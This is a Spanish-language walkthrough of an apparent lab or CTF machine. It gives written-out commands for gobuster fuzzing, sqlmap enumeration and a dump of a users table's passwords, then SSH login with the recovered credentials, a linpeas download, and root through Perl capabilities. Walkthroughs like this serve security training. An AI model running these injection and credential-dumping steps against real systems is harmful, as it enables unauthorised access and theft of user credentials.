Hacemos el reconocimiento con nmap:
![[Pasted image 20230720124301.png]]
Y esto es lo que corre por el puerto 80:
![[Pasted image 20230720124139.png]]
Hacemos fuzzing y encontramos el directorio administrator y server-status:
```bash
gobuster dir -u http://192.168.0.38/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```
![[Pasted image 20230720124411.png]]
En server-status no tenemos permiso para acceder:
![[Pasted image 20230720124547.png]]
Y esto corre en administrator:
![[Pasted image 20230720124445.png]]
En este punto, podemos probar si esto es vulnerable a una sql injection con sqlmap con este parámetro:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms --dbs --batch
```
Y tenemos estas bases de datos:
![[Pasted image 20230720130018.png]]
Ahora vamos a atacar a la base de datos webapp, donde si queremos ver las tablas con sqlmap, debemos usar el siguiente parámetro:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms -D Webapp --tables --batch
```
Y vemos la tabla users:
![[Pasted image 20230720130239.png]]
Ahora para ver las columnas de la tabla Users, lo haríamos de la siguiente forma:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms -D Webapp -T Users --columns --batch
```
![[Pasted image 20230720130627.png]]
Y ahora para ver todos estos registros con los usuarios y contraseñas, lo haríamos con el siguiente parámetro:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms -D Webapp -T Users -C password,id,username --dump --batch
```
![[Pasted image 20230720131304.png]]
Por tanto ahora vamos a probar en acceder por ssh con el usuario bart y contraseña b4rtp0w4:
```bash
bart:b4rtp0w4
```
![[Pasted image 20230720131029.png]]
Una vez dentro, buscamos opciones de escalar privilegios; y para ello podemos usar linpeas, pero previamente lo descargamos con este comando:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
Lo compartimos con la máquina víctima y lo ejecutamos, donde vemos unos archivos de perl con capabilities:
![[Pasted image 20230720131854.png]]
Por tanto vamos a gtfobins y miramos el payload para explotar las capabilities de perl, y tenemos esto:
![[Pasted image 20230720132042.png]]
Por lo que podemos ejecutarlo directamente o en un script:
![[Pasted image 20230720132238.png]]
Y ya somos root al ejecutarlo de cualquiera de las dos formas:
![[Pasted image 20230720132148.png]]
![[Pasted image 20230720132251.png]]

